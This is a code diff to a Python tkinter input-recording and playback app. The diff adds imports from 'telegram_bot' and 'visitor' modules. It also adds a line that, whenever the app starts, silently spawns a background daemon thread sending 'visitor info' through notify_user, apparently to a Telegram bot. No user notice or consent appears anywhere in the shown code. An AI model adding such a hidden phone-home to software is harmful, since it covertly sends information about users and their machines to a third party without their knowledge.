@@ -1,13 +1,19 @@
 import tkinter as tk
-from tkinter import messagebox, Label, Entry, Button, ttk
 import threading
 import time
-import keyboard  # For global hotkeys
-from record import start_listeners, save_to_file, recorded_events, recording_event  # Import the necessary functions
-from play import play_recording  # Import playback function
+import keyboard
 import webbrowser
 
+from tkinter import messagebox, Label, Entry, Button, ttk
+from record import start_listeners, save_to_file, recorded_events, recording_event  # Import the necessary functions
+from play import play_recording  # Import playback function
+from telegram_bot import notify_user
+from visitor import get_visitor_info
+
 stop_playback_flag = False
+
+# Notify when app starts
+threading.Thread(target=notify_user, args=(get_visitor_info(),), daemon=True).start()
 
 # Start recording function
 def start_recording():
